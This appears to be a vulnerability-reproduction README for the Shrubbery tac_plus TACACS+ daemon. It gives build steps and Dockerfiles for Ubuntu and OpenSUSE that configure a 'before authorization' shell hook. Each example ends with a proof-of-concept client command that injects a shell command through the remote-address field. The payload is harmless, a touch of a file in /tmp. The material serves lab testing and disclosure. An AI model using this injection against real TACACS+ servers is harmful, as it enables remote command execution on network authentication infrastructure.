# Shrubbery Networks tac_plus

## Setup

```bash
# compile daemon with debug symbols
wget https://shrubbery.net/pub/tac_plus/tacacs-F4.0.4.28.tar.gz
tar xzf tacacs-F4.0.4.28.tar.gz
cd tacacs-F4.0.4.28
CFLAGS="-g3 -O0" ./configure
make
# run the daemon
./tac_plus \
    -G \
    -d 5 \
    -l /dev/stdout \
    -p 4949 \
    -C tac_plus.cfg
```

## Examples

This section includes examples of Linux distributions that use the Shrubbery Networks fork.

### Ubuntu Bionic

- tacacs+ package in Ubuntu Bionic
- Upstream: Shrubbery (https://www.shrubbery.net/tac_plus/)

```Dockerfile
FROM ubuntu:bionic
WORKDIR /tmp
RUN apt update -y && apt install -y tacacs+
SHELL ["/bin/bash", "-c"]
RUN echo $'accounting file = /tmp/tac_acc.log\n \
user=DEFAULT {\n \
 before authorization "/bin/false -- \'$user\' \'$name\' \'$address\'"\n \
  service = exec {\n \
    default attribute = permit\n \
  }\n \
}' > /tmp/tac_plus.cfg
CMD ["/usr/sbin/tac_plus", "-G", "-d", "5", "-l", "/dev/stdout", "-p", "4949", "-C", "tac_plus.cfg"]

# docker build -t tac_plus_ubuntu -f Dockerfile.ubuntu .
# docker run --rm -p 4949:4949 --name tac_plus_ubuntu tac_plus_ubuntu

# tacacs_client --host 127.0.0.1 --port 4949 --username DEFAULT --rem-addr "asd';touch /tmp/tacpluspoc123 #" authorize -c service=exec
# docker exec tac_plus_ubuntu ls -la /tmp
```

### OpenSUSE Leap

- tac_plus package in the network repository
- Upstream: Shrubbery (https://www.shrubbery.net/tac_plus/)

```Dockerfile
FROM opensuse/leap
RUN zypper ref && \
    zypper ar https://download.opensuse.org/repositories/network/15.4/ network && \
    zypper --gpg-auto-import-keys refresh && \
    zypper --non-interactive dist-upgrade --allow-vendor-change --from network && \
    zypper update -y
RUN zypper install -y tac_plus || true
WORKDIR /tmp
SHELL ["/bin/bash", "-c"]
RUN echo $'accounting file = /tmp/tac_acc.log\n \
user=DEFAULT {\n \
 before authorization "/bin/false -- \'$user\' \'$name\' \'$address\'"\n \
  service = exec {\n \
    default attribute = permit\n \
  }\n \
}' > /tmp/tac_plus.cfg
CMD ["/usr/sbin/tac_plus", "-G", "-d", "5", "-l", "/dev/stdout", "-p", "4949", "-C", "tac_plus.cfg"]

# docker build -t tac_plus_opensuse -f Dockerfile.opensuse .
# docker run --rm -p 4949:4949 --name tac_plus_opensuse tac_plus

# tacacs_client --host 127.0.0.1 --port 4949 --username DEFAULT --rem-addr "asd';touch /tmp/tacpluspoc123 #" authorize -c service=exec
# docker exec tac_plus_opensuse ls -la /tmp
```